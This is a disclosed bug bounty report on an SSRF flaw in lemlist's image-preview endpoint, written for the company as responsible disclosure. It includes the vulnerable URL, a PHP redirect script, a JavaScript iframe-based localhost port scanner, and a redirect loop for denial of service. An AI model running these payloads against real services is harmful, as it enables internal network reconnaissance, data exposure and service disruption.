# SSRF in img.lemlist.com that leads to Localhost Port Scanning

## Report Details
- **Report ID**: 783392
- **URL**: https://hackerone.com/reports/783392
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-26T00:06:09.103Z
- **Disclosed**: 2020-05-28T10:39:49.300Z

## Reporter
- **Username**: arsene_lupin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: lemlist

## Vulnerability Information
## Summary:
A SSRF attack can be performed leading to localhost port scanning.
Link : https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@

## Steps To Reproduce:
To perform this port scan you'll need to setup a few files.

First of all you need to change the url in {F696241}. {F696243}

That being done you will need to do the same thing in your redirection script
```php
<?php
	// PHP permanent URL redirection
	header("Location: [YOUR WEBSITE]/PoC.html?i=0", true, 301);
	exit();
?>
```

Now you need to setup a website who will host {F696241}, {F696249} and the redirection.

I suggest to put everything in a single file and run the command :
`php -S 0.0.0.0:80`

Afterward you need to go to the following link:
`https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@ [YOUR WEBSITE]`

## PoC
Here is a PoC of the Port Scan beeing performed {F696236}

## Advice

Sometimes this port scan only return one port or none due to headless chrome screenshoting the website before the redirection. I would suggest to try different timeout in the ` scanChromeLinux()` function.

```javascript
async scanChromeLinux(iframe, a) {
    var that = this;
    let promise = new Promise(function(resolve, reject){
        that.hooks = {oncomplete:function(){
          document.body.removeChild(iframe);
          resolve();
        }};
        that.scan = function() {
            var port = that.q.shift(), calls = 0, timer;
            iframe.src = that.url + ":" + port;
            a.href = iframe.src + '#';
            that.updateProgress(port);
            iframe.hasLoadedOnce = 0;
            iframe.onload = function(){
                calls++;
                if(calls > 1) {
                  clearTimeout(timer);
                  that.next();
                  return;
                }
                iframe.hasLoadedOnce = 1;
                a.click();
            };
            timer = setTimeout(function(){
              if(iframe.hasLoadedOnce) {
                that.openPorts.push(port);
              }
              that.next();
            }, 500 ); // <-- CHANGE THAT VALUE
        };
        that.scan();
    });
    return promise;
  }
```

##Bonus

You can perform a DOS on the website by making the redirection returning itself: 
```php
<?php
	// PHP permanent URL redirection
	header("Location:https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@[YOUR WEBSITE]", true, 301);
	exit();
?>
```

## Impact

We can Port Scan local and remote servers, directory and bruteforce HTTP services.
Besides if the screenshot as enough quality, it would be possible to return sensitives data from local HTTP services running on the machine.

## Attachments
- PoC.mp4
- PoC.html
- changeline.png
- stealer.php
